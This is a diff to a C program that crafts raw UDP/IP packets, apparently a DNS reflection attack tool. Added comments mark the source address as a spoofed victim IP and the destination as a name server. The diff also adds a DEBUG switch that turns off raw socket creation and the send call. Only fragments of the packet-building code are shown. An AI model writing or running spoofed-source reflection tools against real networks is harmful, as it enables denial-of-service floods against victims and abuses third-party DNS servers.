@@ -35,6 +35,8 @@
 #include <netdb.h>
 #include <unistd.h>
 
+#define DEBUG 1
+
 typedef struct __attribute__((packed, aligned(1)))
 {
     uint32_t sourceaddr;
@@ -179,10 +181,12 @@ main(int argc, char** argv)
         goto fail_state;
     }
 
-    // raw_sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
-    // if (raw_sockfd == -1) {
-    //     goto fail_state;
-    // }
+#if DEBUG == 0
+    raw_sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+    if (raw_sockfd == -1) {
+        goto fail_state;
+    }
+#endif
 
     resolvip = argv[ 1 ];
     resolvprt = argv[ 2 ];
@@ -217,7 +221,10 @@ main(int argc, char** argv)
 
     szdatagram = buflen;
     insert_data(( void** ) &curpos, &szdatagram, pktbuf, nwritten);
+
+#if DEBUG == 0
     sendto(raw_sockfd, pktbuf, nwritten, 0, ( const struct sockaddr* ) &addr, sizeof(addr));
+#endif
 
     close(raw_sockfd);
 
@@ -240,8 +247,8 @@ pack_iphdr(IPHEADER* iphdr, PSEUDOHDR* pseudohdr, const char* sourceip, const ch
     iphdr->id = htons(ID);
     iphdr->ttl = 0xff;
     iphdr->protocol = getprotobyname("udp")->p_proto;
-    iphdr->saddr = inet_addr(sourceip);
-    iphdr->daddr = inet_addr(destip);
+    iphdr->saddr = inet_addr(sourceip); // spoofed ip address to victim
+    iphdr->daddr = inet_addr(destip); // name server 
 
     memset(pseudohdr, 0, sizeof(PSEUDOHDR));
     pseudohdr->protocol = iphdr->protocol;
